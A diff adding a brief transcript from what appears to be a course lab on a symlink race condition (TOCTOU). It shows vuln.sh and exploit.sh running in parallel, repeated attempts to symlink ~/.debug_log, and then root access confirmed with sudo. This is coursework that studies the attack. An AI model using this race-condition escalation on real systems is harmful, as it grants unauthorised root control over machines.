@@ -1,0 +1,41 @@
+Commands used [Transcript]:
+
+
+>Terminal 1:
+
+>>>inoroot@csc347-a2:/A2/Racing/Fast$ ./vuln.sh				
+Writing debug message.
+Goodbye!
+Writing debug message.
+Goodbye!
+Invoking user does not have access to log file. DENIED.
+Invoking user does not have access to log file. DENIED.
+Invoking user does not have access to log file. DENIED.
+Invoking user does not have access to log file. DENIED.
+Writing debug message.
+Goodbye!
+Invoking user does not have access to log file. DENIED.
+Invoking user does not have access to log file. DENIED.
+^C
+
+
+
+>Terminal 2:
+
+>>>inoroot@csc347-a2:/A2/Racing/Fast$ ./exploit.sh 
+ln: failed to create symbolic link `/home/inoroot/.debug_log': File exists
+ln: failed to create symbolic link `/home/inoroot/.debug_log': File exists
+ln: failed to create symbolic link `/home/inoroot/.debug_log': File exists
+ln: failed to create symbolic link `/home/inoroot/.debug_log': File exists
+^C
+
+
+
+>Checking to see if we have root privileges:
+
+>>>inoroot@csc347-a2:~$ sudo whoami
+>>>[sudo] password for inoroot: 
+Root
+>>>inoroot@csc347-a2:/A2/Racing/Fast$ sudo -i
+>>>root@csc347-a2:~# ls
+rhosts
